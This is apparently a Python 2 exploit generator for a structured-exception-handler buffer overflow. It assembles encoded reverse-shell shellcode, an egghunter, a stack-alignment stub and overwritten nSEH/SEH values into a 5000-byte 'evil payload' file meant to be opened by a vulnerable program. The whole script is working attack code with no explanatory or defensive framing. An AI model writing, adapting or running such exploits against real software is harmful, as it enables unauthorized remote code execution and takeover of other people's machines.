#!/usr/bin/python

import struct

revshell =  "babababa"
revshell += "\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc"
revshell += b"\x89\xe1\xdb\xd5\xd9\x71\xf4\x5f\x57\x59\x49\x49"
revshell += b"\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43"
revshell += b"\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
revshell += b"\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
revshell += b"\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
revshell += b"\x6b\x4c\x58\x68\x4b\x32\x53\x30\x37\x70\x57\x70"
revshell += b"\x75\x30\x4b\x39\x4b\x55\x46\x51\x79\x50\x33\x54"
revshell += b"\x4e\x6b\x46\x30\x66\x50\x6e\x6b\x36\x32\x34\x4c"
revshell += b"\x4e\x6b\x66\x32\x77\x64\x4e\x6b\x30\x72\x55\x78"
revshell += b"\x56\x6f\x4c\x77\x52\x6a\x57\x56\x45\x61\x49\x6f"
revshell += b"\x4e\x4c\x55\x6c\x70\x61\x73\x4c\x37\x72\x64\x6c"
revshell += b"\x45\x70\x6a\x61\x58\x4f\x36\x6d\x46\x61\x58\x47"
revshell += b"\x6b\x52\x7a\x52\x53\x62\x72\x77\x6c\x4b\x76\x32"
revshell += b"\x76\x70\x4e\x6b\x42\x6a\x35\x6c\x6c\x4b\x72\x6c"
revshell += b"\x56\x71\x61\x68\x6b\x53\x37\x38\x65\x51\x68\x51"
revshell += b"\x30\x51\x6e\x6b\x36\x39\x67\x50\x67\x71\x6b\x63"
revshell += b"\x4c\x4b\x42\x69\x77\x68\x79\x73\x77\x4a\x73\x79"
revshell += b"\x4e\x6b\x34\x74\x4c\x4b\x56\x61\x79\x46\x55\x61"
revshell += b"\x6b\x4f\x6e\x4c\x7a\x61\x58\x4f\x44\x4d\x45\x51"
revshell += b"\x49\x57\x36\x58\x59\x70\x43\x45\x5a\x56\x43\x33"
revshell += b"\x43\x4d\x38\x78\x35\x6b\x73\x4d\x34\x64\x74\x35"
revshell += b"\x4b\x54\x63\x68\x6e\x6b\x43\x68\x74\x64\x36\x61"
revshell += b"\x39\x43\x42\x46\x6e\x6b\x64\x4c\x50\x4b\x4e\x6b"
revshell += b"\x32\x78\x67\x6c\x37\x71\x78\x53\x4c\x4b\x34\x44"
revshell += b"\x6c\x4b\x46\x61\x6e\x30\x6e\x69\x72\x64\x65\x74"
revshell += b"\x31\x34\x63\x6b\x51\x4b\x50\x61\x50\x59\x70\x5a"
revshell += b"\x62\x71\x39\x6f\x69\x70\x33\x6f\x71\x4f\x70\x5a"
revshell += b"\x6e\x6b\x36\x72\x7a\x4b\x4c\x4d\x61\x4d\x43\x5a"
revshell += b"\x46\x61\x4e\x6d\x6e\x65\x68\x32\x47\x70\x37\x70"
revshell += b"\x37\x70\x62\x70\x53\x58\x66\x51\x4e\x6b\x30\x6f"
revshell += b"\x6e\x67\x79\x6f\x58\x55\x6f\x4b\x48\x70\x6c\x75"
revshell += b"\x6f\x52\x71\x46\x31\x78\x79\x36\x4f\x65\x6d\x6d"
revshell += b"\x4f\x6d\x79\x6f\x38\x55\x65\x6c\x37\x76\x51\x6c"
revshell += b"\x77\x7a\x4f\x70\x69\x6b\x4d\x30\x73\x45\x75\x55"
revshell += b"\x4d\x6b\x62\x67\x34\x53\x63\x42\x32\x4f\x70\x6a"
revshell += b"\x37\x70\x51\x43\x59\x6f\x6e\x35\x73\x53\x43\x51"
revshell += b"\x42\x4c\x31\x73\x46\x4e\x70\x65\x63\x48\x63\x55"
revshell += b"\x63\x30\x41\x41"



egghunter = "TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIPfOqhJYoVo2bv2sZwrShjmtnwL5UQJt4XonXBBqqRBCQnkijLoBUJJlosEZGYoIwAA"

alignESP= "\x54\x58\x66\x05\xF9\x18\x50\x5C\xFF\xE4"

nSEH = "\x74\x06\x75\x04"            # JZ - 74 and KNZ - 75
SEH  = struct.pack("<I", 0x0135ebee) # popad # jmp ebp |  {PAGE_READWRITE}

buffer  = revshell
buffer += "A" * (2101 - len(revshell))
buffer += nSEH
buffer += SEH
buffer += alignESP
buffer += "\x90" * 3
buffer += egghunter
buffer += "\x90" * (5000 - len(buffer))

f=open("Payload.txt","w")
print "[+] Creating %s bytes evil payload.." %len(buffer)
f.write(buffer)
f.close()
print "[+] File created!"

